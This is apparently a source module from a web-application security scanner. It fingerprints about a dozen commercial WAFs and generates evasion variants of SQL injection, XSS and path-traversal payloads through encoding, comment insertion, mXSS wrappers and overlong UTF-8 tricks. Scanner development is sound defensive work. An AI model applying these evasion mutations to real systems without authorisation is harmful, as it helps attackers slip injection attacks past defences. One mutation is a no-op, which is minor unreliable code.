"""WAF detection and evasion payload module for DAST scanning.

Fingerprints 12+ common Web Application Firewalls from HTTP response
artefacts (headers, cookies, status codes, body patterns) and provides
payload-mutation helpers that generate WAF-evasion variants for SQLi,
XSS, and generic injection payloads.
"""

from __future__ import annotations

import re
import urllib.parse
from dataclasses import dataclass, field
from typing import List, Optional, Tuple


# ---------------------------------------------------------------------------
# Result dataclass
# ---------------------------------------------------------------------------

@dataclass
class WAFResult:
    """Outcome of a WAF fingerprinting attempt."""

    detected: bool = False
    waf_name: Optional[str] = None
    confidence: float = 0.0
    signatures_matched: list[str] = field(default_factory=list)


# ---------------------------------------------------------------------------
# Fingerprint rules
# ---------------------------------------------------------------------------

@dataclass
class _WAFRule:
    """Single fingerprint rule contributing toward a WAF match."""

    name: str
    header: Optional[str] = None          # header name (case-insensitive)
    header_value: Optional[str] = None    # regex matched against header value
    cookie: Optional[str] = None          # cookie name substring
    body_pattern: Optional[str] = None    # regex searched in body
    status_code: Optional[int] = None     # required status code (if any)
    weight: float = 0.5                   # contribution toward confidence


# All rules grouped by WAF product.
_WAF_SIGNATURES: dict[str, list[_WAFRule]] = {
    "Cloudflare": [
        _WAFRule("cf-ray header", header="cf-ray", weight=0.5),
        _WAFRule("__cfduid cookie", cookie="__cfduid", weight=0.3),
        _WAFRule("Attention Required body", body_pattern=r"Attention Required[!.]", weight=0.4),
        _WAFRule("cf-cache-status header", header="cf-cache-status", weight=0.2),
        _WAFRule("server: cloudflare", header="server", header_value=r"(?i)cloudflare", weight=0.5),
    ],
    "AWS WAF": [
        _WAFRule("x-amzn-requestid header", header="x-amzn-requestid", weight=0.5),
        _WAFRule("403 Request blocked", status_code=403, body_pattern=r"(?i)request\s+blocked", weight=0.6),
        _WAFRule("x-amzn-errortype header", header="x-amzn-errortype", weight=0.3),
    ],
    "ModSecurity": [
        _WAFRule("Mod_Security server", header="server", header_value=r"(?i)mod_security", weight=0.6),
        _WAFRule("NOYB body", body_pattern=r"NOYB", weight=0.4),
        _WAFRule("ModSecurity body reference", body_pattern=r"(?i)modsecurity", weight=0.5),
    ],
    "Akamai": [
        _WAFRule("AkamaiGHost server", header="server", header_value=r"(?i)akamaighost", weight=0.6),
        _WAFRule("Reference# body", body_pattern=r"Reference\s*#\s*[\d.]+", weight=0.5),
        _WAFRule("x-akamai-transformed header", header="x-akamai-transformed", weight=0.3),
    ],
    "Imperva/Incapsula": [
        _WAFRule("incap_ses cookie", cookie="incap_ses", weight=0.6),
        _WAFRule("visid_incap cookie", cookie="visid_incap", weight=0.5),
        _WAFRule("x-iinfo header", header="x-iinfo", weight=0.4),
    ],
    "F5 BigIP": [
        _WAFRule("BigIP cookie", cookie="BigIP", weight=0.6),
        _WAFRule("TS cookie prefix", cookie="TS", weight=0.4),
        _WAFRule("x-cnection header", header="x-cnection", weight=0.3),
    ],
    "Sucuri": [
        _WAFRule("sucuri-cache header", header="sucuri-cache", weight=0.5),
        _WAFRule("X-Sucuri-ID header", header="x-sucuri-id", weight=0.6),
        _WAFRule("Sucuri body", body_pattern=r"(?i)sucuri", weight=0.3),
    ],
    "Barracuda": [
        _WAFRule("barra_counter cookie", cookie="barra_counter", weight=0.6),
        _WAFRule("barracuda body", body_pattern=r"(?i)barracuda", weight=0.4),
    ],
    "Fortinet/FortiWeb": [
        _WAFRule("FORTIWAFSID cookie", cookie="FORTIWAFSID", weight=0.7),
        _WAFRule("fortigate body", body_pattern=r"(?i)fortigate", weight=0.4),
        _WAFRule("fortiwebserver header", header="server", header_value=r"(?i)fortiweb", weight=0.5),
    ],
    "Azure Front Door": [
        _WAFRule("x-azure-ref header", header="x-azure-ref", weight=0.6),
        _WAFRule("azure body", body_pattern=r"(?i)azure\s+front\s+door", weight=0.3),
    ],
    "Google Cloud Armor": [
        _WAFRule("403 fingerprint", status_code=403, body_pattern=r"(?i)google", weight=0.3),
        _WAFRule("via google header", header="via", header_value=r"(?i)google", weight=0.4),
        _WAFRule("x-goog-* header", header="x-goog-request-id", weight=0.4),
        _WAFRule("server: gfe", header="server", header_value=r"(?i)\bgfe\b", weight=0.5),
    ],
    "Wordfence": [
        _WAFRule("wfvt_ cookie", cookie="wfvt_", weight=0.6),
        _WAFRule("wordfence body", body_pattern=r"(?i)wordfence", weight=0.5),
        _WAFRule("wf_loginalerted cookie", cookie="wf_loginalerted", weight=0.3),
    ],
}


# ---------------------------------------------------------------------------
# WAFDetector
# ---------------------------------------------------------------------------

class WAFDetector:
    """Fingerprint WAF products from one or more HTTP responses."""

    def __init__(self) -> None:
        self.signatures = _WAF_SIGNATURES

    # -- internal helpers ---------------------------------------------------

    @staticmethod
    def _header_present(headers: dict[str, str], name: str) -> Optional[str]:
        """Case-insensitive header lookup; returns value or None."""
        lower = name.lower()
        for k, v in headers.items():
            if k.lower() == lower:
                return v
        return None

    @staticmethod
    def _cookie_contains(headers: dict[str, str], fragment: str) -> bool:
        """Return True if any Set-Cookie / Cookie header contains *fragment*."""
        for k, v in headers.items():
            if k.lower() in ("set-cookie", "cookie") and fragment in v:
                return True
        return False

    def _evaluate_rule(
        self,
        rule: _WAFRule,
        status: int,
        headers: dict[str, str],
        body: str,
    ) -> bool:
        """Return True if the rule matches the response."""
        if rule.status_code is not None and status != rule.status_code:
            return False

        if rule.header:
            val = self._header_present(headers, rule.header)
            if val is None:
                return False
            if rule.header_value and not re.search(rule.header_value, val):
                return False

        if rule.cookie and not self._cookie_contains(headers, rule.cookie):
            return False

        if rule.body_pattern and not re.search(rule.body_pattern, body):
            return False

        return True

    # -- public API ---------------------------------------------------------

    def detect(
        self,
        responses: list[Tuple[int, dict, str]],
    ) -> WAFResult:
        """Detect WAF across multiple responses.

        Args:
            responses: list of (status_code, headers_dict, body_snippet).

        Returns:
            WAFResult with the highest-confidence WAF match (if any).
        """
        best = WAFResult()

        for waf_name, rules in self.signatures.items():
            matched: list[str] = []
            total_weight = 0.0

            for rule in rules:
                for status, headers, body in responses:
                    if self._evaluate_rule(rule, status, headers, body):
                        matched.append(rule.name)
                        total_weight += rule.weight
                        break  # one match per rule is enough

            if not matched:
                continue

            max_weight = sum(r.weight for r in rules)
            confidence = min(total_weight / max_weight, 1.0) if max_weight else 0.0

            if confidence > best.confidence:
                best = WAFResult(
                    detected=True,
                    waf_name=waf_name,
                    confidence=round(confidence, 2),
                    signatures_matched=matched,
                )

        return best

    def detect_from_response(
        self,
        status: int,
        headers: dict[str, str],
        body: str,
    ) -> WAFResult:
        """Convenience wrapper for a single HTTP response."""
        return self.detect([(status, headers, body)])


# ---------------------------------------------------------------------------
# WAFEvasionPayloads
# ---------------------------------------------------------------------------

class WAFEvasionPayloads:
    """Static helpers that return evasion variants of injection payloads."""

    # -- SQLi evasion -------------------------------------------------------

    @staticmethod
    def get_sqli_evasion(base_payload: str) -> list[str]:
        """Return 8 WAF-evasion variants of a SQL injection payload."""
        variants: list[str] = []

        # 1. URL-encode special chars
        variants.append(urllib.parse.quote(base_payload, safe=""))

        # 2. Double URL-encode
        variants.append(urllib.parse.quote(urllib.parse.quote(base_payload, safe=""), safe=""))

        # 3. Case alternation (e.g., SeLeCt)
        alt = "".join(
            ch.upper() if i % 2 else ch.lower()
            for i, ch in enumerate(base_payload)
        )
        variants.append(alt)

        # 4. Inline-comment insertion: UNION SELECT -> UN/**/ION SE/**/LECT
        commented = re.sub(r"(?i)(\w{2})(\w+)", r"\1/**/\2", base_payload)
        variants.append(commented)

        # 5. Hex-encode string literals ('admin' -> 0x61646d696e)
        def _hex_strings(m: re.Match) -> str:
            inner = m.group(1)
            return "0x" + inner.encode().hex()

        variants.append(re.sub(r"'([^']+)'", _hex_strings, base_payload))

        # 6. Unicode full-width substitution for key chars
        _fw_map = str.maketrans(
            "()=<>'\" ", "\uff08\uff09\uff1d\uff1c\uff1e\uff07\uff02\u3000"
        )
        variants.append(base_payload.translate(_fw_map))

        # 7. Whitespace alternatives (tabs, /**/, %0a)
        variants.append(base_payload.replace(" ", "\t"))
        variants.append(base_payload.replace(" ", "%0a"))

        return variants

    # -- XSS evasion --------------------------------------------------------

    @staticmethod
    def get_xss_evasion(base_payload: str) -> list[str]:
        """Return 8 WAF-evasion variants of an XSS payload."""
        variants: list[str] = []

        # 1. HTML-entity encode angle brackets
        variants.append(base_payload.replace("<", "&lt;").replace(">", "&gt;"))

        # 2. Decimal HTML entities for < and >
        variants.append(base_payload.replace("<", "&#60;").replace(">", "&#62;"))

        # 3. Tag case variation
        def _rand_case_tag(m: re.Match) -> str:
            tag = m.group(1)
            mixed = "".join(
                c.upper() if i % 2 else c.lower() for i, c in enumerate(tag)
            )
            return f"<{mixed}"

        variants.append(re.sub(r"<(\w+)", _rand_case_tag, base_payload))

        # 4. SVG wrapper
        variants.append(f"<svg/onload={base_payload}>")

        # 5. MATH tag wrapper
        variants.append(f"<math><mtext><table><mglyph><style><!--</style>"
                        f"<img src=x onerror={base_payload}>//")

        # 6. Event handler alternative (onerror -> onmouseover)
        variants.append(base_payload.replace("onerror", "onmouseover"))

        # 7. Protocol-relative payload injection
        variants.append(base_payload.replace("javascript:", "&#106;avascript:"))

        # 8. Double-encoding of angle brackets
        variants.append(
            base_payload.replace("<", "%253C").replace(">", "%253E")
        )

        return variants

    # -- Generic evasion ----------------------------------------------------

    @staticmethod
    def get_generic_evasion(payload: str) -> list[str]:
        """Return 8 generic evasion variants (encoding, null bytes, etc.)."""
        variants: list[str] = []

        # 1. Null byte insertion before key chars
        variants.append(payload.replace("=", "%00="))

        # 2. Path traversal alternative: ../ -> ....//
        variants.append(payload.replace("../", "....//"))

        # 3. Path traversal with backslash
        variants.append(payload.replace("../", r"..\\"))

        # 4. URL-encoded dots/slashes
        variants.append(payload.replace("../", "%2e%2e%2f"))

        # 5. Parameter pollution: duplicate first param char as decoy
        variants.append(f"x=1&{payload}")

        # 6. Chunked-style body (header-level hint + payload)
        variants.append(f"0\r\n\r\n{payload}")

        # 7. UTF-8 overlong encoding of '/' (0x2f -> 0xc0 0xaf)
        variants.append(payload.replace("/", "%c0%af"))

        # 8. Mixed case percent-encoding
        variants.append(urllib.parse.quote(payload, safe="").replace("%2", "%2"))

        return variants
